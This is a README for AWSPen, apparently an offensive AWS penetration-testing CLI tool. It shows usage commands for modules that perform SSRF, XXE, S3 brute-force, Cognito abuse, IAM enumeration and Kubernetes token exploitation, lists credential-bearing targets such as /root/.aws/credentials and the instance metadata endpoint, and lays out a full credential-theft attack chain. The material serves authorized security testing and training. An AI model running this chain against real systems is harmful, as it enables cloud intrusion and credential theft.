# AWSPen 🔥

> Modular AWS Penetration Testing Automation Tool

A hands-on CLI tool that automates common AWS pentesting attack vectors. Built based on real-world techniques from the CCPenX-AWS certification exam.

---

## Features

| Module | Description |
|--------|-------------|
| `recon` | Reconnaissance — robots.txt, JS analysis, DNS, headers |
| `s3` | S3 bucket enumeration, naming convention brute-force, sensitive file detection |
| `ssrf` | SSRF exploitation via file:// and AWS metadata endpoints |
| `xxe` | XXE injection to read local files and steal credentials |
| `cognito` | AWS Cognito misconfiguration detection and exploitation |
| `iam` | IAM enumeration with stolen/provided credentials |
| `k8s` | Kubernetes service account token exploitation against EKS |

---

## Installation

```bash
git clone https://github.com/burakkorkmaz/awspen
cd awspen
chmod +x awspen.sh
```

**Requirements:**
- `bash`
- `curl`
- `dig` (dnsutils)
- `aws-cli` — `pip install awscli`
- `python3`

---

## Usage

```bash
./awspen.sh --module <module> [options]
```

---

## Modules

### Recon

```bash
./awspen.sh --module recon --target https://example.com
```

- Fetches and parses `robots.txt`
- Analyzes HTTP headers for cloud provider hints
- DNS CNAME lookup (S3 bucket and region detection)
- JavaScript file analysis for hidden endpoints and secrets
- Common sensitive path discovery

---

### S3 Bucket Enumeration

```bash
# Check a specific bucket
./awspen.sh --module s3 --bucket mybucket --region ap-south-1

# With credentials
./awspen.sh --module s3 --bucket mybucket --region ap-south-1 \
  --key AKIA... --secret ...

# Enumerate naming conventions
./awspen.sh --module s3 --enumerate myapp --region ap-south-1
# Tries: myapp-prod, myapp-dev, myapp-staging, myapp-test...
```

---

### SSRF Exploitation

```bash
./awspen.sh --module ssrf \
  --url https://api.example.com/file \
  --token abc123 \
  --header authorizationToken \
  --param fileName
```

Automatically tests:
- `file:///proc/self/environ` — AWS keys in Lambda/container
- `file:///etc/passwd`
- `file:///etc/secret.txt`
- `file:///var/run/secrets/kubernetes.io/serviceaccount/token`
- `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- `http://169.254.170.2/v2/credentials` — ECS/Lambda

---

### XXE Injection

```bash
./awspen.sh --module xxe \
  --url https://api.example.com/data \
  --tag name
```

Automatically tries:
- `/etc/passwd`
- `/etc/secret.txt`
- `/proc/self/environ`
- `/var/run/secrets/kubernetes.io/serviceaccount/token`
- `/root/.aws/credentials`

---

### Cognito Misconfiguration

```bash
./awspen.sh --module cognito --target https://auth.example.com
```

- Tests self-registration
- Detects Cognito region from error messages
- Attempts user pool enumeration
- Admin-confirms user if credentials available

---

### IAM Enumeration

```bash
./awspen.sh --module iam \
  --key ASIA3PI3WQDU... \
  --secret EL88MBCDd7gg... \
  --session-token IQoJ... \
  --region us-east-1
```

Checks access to: S3, Secrets Manager, Lambda, EC2, IAM, EKS, SSM, RDS

---

### Kubernetes Token Exploitation

```bash
./awspen.sh --module k8s \
  --token eyJhbGciOiJSUzI1... \
  --api-server https://CLUSTER.gr7.ap-south-1.eks.amazonaws.com \
  --namespace default
```

- Decodes JWT and extracts service account info
- Lists secrets, pods, configmaps
- Auto-decodes base64-encoded secret values
- Highlights flags and credentials

---

## Example Full Attack Chain

```bash
# 1. Recon
./awspen.sh --module recon --target https://app.example.com

# 2. Exploit SSRF to steal Lambda credentials
./awspen.sh --module ssrf \
  --url https://api.example.com/file \
  --token 0559422a-643b-11ee-8c99-0242ac120002

# 3. Use stolen credentials for IAM enumeration
./awspen.sh --module iam \
  --key ASIA... --secret ... --session-token ...

# 4. Exploit XXE to steal K8s service account token
./awspen.sh --module xxe --url https://api.example.com/data

# 5. Use K8s token against EKS API
./awspen.sh --module k8s \
  --token eyJ... \
  --api-server https://CLUSTER.gr7.ap-south-1.eks.amazonaws.com
```

---

## Output

Results are saved in the `output/` directory with timestamps.

---

## Disclaimer

> This tool is for **educational purposes only**. Only use it against systems you own or have explicit written permission to test. Unauthorized testing is illegal.

---

*by [burak korkmaz](https://github.com/burakkorkmaz)*
